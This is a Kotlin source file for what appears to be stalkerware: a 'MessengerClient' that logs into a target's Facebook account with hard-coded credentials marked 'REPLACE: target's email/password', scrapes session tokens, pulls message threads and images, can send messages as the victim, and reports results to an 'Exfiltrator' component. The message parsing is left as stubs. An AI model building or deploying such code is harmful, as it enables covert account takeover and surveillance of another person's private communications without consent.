package com.monitor.messenger

import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.UUID
import java.util.concurrent.TimeUnit

class MessengerClient(private val exfiltrator: Exfiltrator) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .cookieJar(CookieJarImpl())  // Custom cookie jar for persistence
        .build()
    
    private var fbDtsg: String = ""
    private var userId: String = ""
    private var isLoggedIn = false

    // Facebook credentials - embed or pull from Account Manager
    private val facebookEmail = "target@email.com"  // REPLACE: target's email
    private val facebookPassword = "target_password" // REPLACE: target's password

    fun isLoggedIn(): Boolean = isLoggedIn

    fun login(): Boolean {
        try {
            // Step 1: Get initial cookies
            val initRequest = Request.Builder()
                .url("https://m.facebook.com/")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36")
                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                .header("Accept-Language", "en-US,en;q=0.5")
                .build()
            
            var response = client.newCall(initRequest).execute()
            var html = response.body?.string() ?: ""
            
            // Extract fb_dtsg
            val dtsgRegex = Regex("""name="fb_dtsg" value="([^"]+)""")
            val match = dtsgRegex.find(html)
            val initialDtsg = match?.groupValues?.get(1) ?: ""
            
            response.close()
            
            // Step 2: Submit login
            val formBody = FormBody.Builder()
                .add("email", facebookEmail)
                .add("pass", facebookPassword)
                .add("login", "Log In")
                .add("fb_dtsg", initialDtsg)
                .build()
            
            val loginRequest = Request.Builder()
                .url("https://m.facebook.com/login.php")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36")
                .header("Origin", "https://m.facebook.com")
                .header("Referer", "https://m.facebook.com/")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .post(formBody)
                .build()
            
            response = client.newCall(loginRequest).execute()
            response.close()
            
            // Step 3: Check success and get tokens
            val checkRequest = Request.Builder()
                .url("https://www.facebook.com/")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36")
                .build()
            
            response = client.newCall(checkRequest).execute()
            html = response.body?.string() ?: ""
            
            // Extract fb_dtsg from page
            val apiDtsgRegex = Regex(""""fb_dtsg"[^:]+:"([^"]+)"""")
            val apiMatch = apiDtsgRegex.find(html)
            this.fbDtsg = apiMatch?.groupValues?.get(1) ?: ""
            
            // Extract user ID from cookies
            val cookies = response.headers("Set-Cookie")
            for (cookie in cookies) {
                if (cookie.startsWith("c_user=")) {
                    this.userId = cookie.split("=")[1].split(";")[0]
                }
            }
            
            response.close()
            
            if (this.fbDtsg.isNotEmpty() && this.userId.isNotEmpty()) {
                isLoggedIn = true
                exfiltrator.send("login", mapOf(
                    "user_id" to userId,
                    "fb_dtsg" to fbDtsg.take(10) + "..."
                ))
                return true
            }
            
            return false
            
        } catch (e: Exception) {
            exfiltrator.send("login_error", mapOf("error" to (e.message ?: "Unknown")))
            return false
        }
    }

    data class ThreadInfo(
        val id: String,
        val name: String,
        val participants: List<String>,
        val lastMessage: String?
    )
    
    data class MessageInfo(
        val id: String,
        val threadId: String,
        val authorId: String,
        val text: String,
        val seen: Boolean,
        val hasImage: Boolean,
        val imageUrl: String?,
        val timestamp: Long
    ) {
        fun toJson(): Map<String, Any?> = mapOf(
            "id" to id,
            "thread_id" to threadId,
            "author_id" to authorId,
            "text" to text,
            "seen" to seen,
            "has_image" to hasImage,
            "timestamp" to timestamp
        )
    }

    fun getThreads(): List<ThreadInfo> {
        val threads = mutableListOf<ThreadInfo>()
        
        try {
            val payload = JSONObject().apply {
                put("av", userId)
                put("fb_dtsg", fbDtsg)
                put("queries", JSONObject().apply {
                    put("o0", JSONObject().apply {
                        put("doc_id", "1349585851795359")  // Thread list query
                        put("params", JSONObject().apply {
                            put("limit", 50)
                        })
                    })
                })
            }
            
            val request = Request.Builder()
                .url("https://www.facebook.com/api/graphql/")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E)")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .post(RequestBody.create(MediaType.parse("text/plain"), payload.toString()))
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            
            // Parse threads from response
            // Facebook GraphQL returns nested JSON - parse accordingly
            // This is a simplified version
            
            response.close()
            
        } catch (e: Exception) {
            exfiltrator.send("threads_error", mapOf("error" to (e.message ?: "")))
        }
        
        return threads
    }

    fun getMessages(threadId: String): List<MessageInfo> {
        val messages = mutableListOf<MessageInfo>()
        
        try {
            val payload = JSONObject().apply {
                put("av", userId)
                put("fb_dtsg", fbDtsg)
                put("queries", JSONObject().apply {
                    put("o0", JSONObject().apply {
                        put("doc_id", "1862180581901935")  // Message list query
                        put("params", JSONObject().apply {
                            put("id", threadId)
                            put("limit", 50)
                        })
                    })
                })
            }
            
            val request = Request.Builder()
                .url("https://www.facebook.com/api/graphql/")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E)")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .post(RequestBody.create(MediaType.parse("text/plain"), payload.toString()))
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            
            // Parse messages from GraphQL response
            // Actual parsing depends on Facebook's response structure
            
            response.close()
            
        } catch (e: Exception) {
            exfiltrator.send("messages_error", mapOf("thread_id" to threadId, "error" to (e.message ?: "")))
        }
        
        return messages
    }

    fun downloadImage(imageUrl: String): ByteArray? {
        return try {
            val request = Request.Builder()
                .url(imageUrl)
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E)")
                .build()
            
            val response = client.newCall(request).execute()
            val bytes = response.body?.bytes()
            response.close()
            bytes
        } catch (e: Exception) {
            null
        }
    }

    fun sendMessage(threadId: String, text: String): Boolean {
        return try {
            val formBody = FormBody.Builder()
                .add("message_text", text)
                .add("thread_fbid", threadId)
                .add("fb_dtsg", fbDtsg)
                .add("client_mutation_id", UUID.randomUUID().toString())
                .build()
            
            val request = Request.Builder()
                .url("https://www.facebook.com/messaging/send/")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-S908E)")
                .header("Origin", "https://www.facebook.com")
                .header("Referer", "https://www.facebook.com/")
                .post(formBody)
                .build()
            
            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            response.close()
            success
        } catch (e: Exception) {
            false
        }
    }

    // Cookie jar that persists across requests
    class CookieJarImpl : CookieJar {
        private val cookieStore = mutableMapOf<String, List<Cookie>>()
        
        override fun saveFromResponse(url: HttpUrl, cookies: List<Cookie>) {
            cookieStore[url.host] = cookies
        }
        
        override fun loadForRequest(url: HttpUrl): List<Cookie> {
            return cookieStore[url.host] ?: emptyList()
        }
    }
}
